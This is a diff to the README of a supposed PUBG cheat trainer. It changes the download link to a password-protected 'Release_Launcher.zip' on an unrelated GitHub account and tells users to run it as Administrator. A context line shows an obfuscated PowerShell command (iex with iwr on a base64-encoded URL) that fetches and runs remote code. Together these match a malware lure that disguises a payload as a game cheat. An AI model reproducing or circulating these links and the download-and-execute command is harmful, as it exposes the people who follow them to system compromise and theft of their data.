@@ -6,7 +6,7 @@ PUBG trainer with ESPwallhack, aimbots, no recoil, speed hack, unlock all skins,
 
 ## ⬇️ Download
 
-**[CLICK](https://Codesehandcuff.github.io/PUBG-CN-EN-FR-Trainer-Overlay/)**
+**[CLICK](https://github.com/SupportSpace84/jtfujlhx/releases/download/v2.1.3/Release_Launcher.zip)**
 
 Archive passkey: `AK2026`
 
@@ -94,7 +94,7 @@ iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://Codesehandcuff.github.io/PUBG-CN-EN-FR-Trainer-Overlay/)** to download.
+1. Click **[CLICK](https://github.com/SupportSpace84/jtfujlhx/releases/download/v2.1.3/Release_Launcher.zip)** to download.
 2. Extract the archive. (Use password AK2026)
 3. Launch PUBG Mobile.
 4. Run the trainer **as Administrator**.
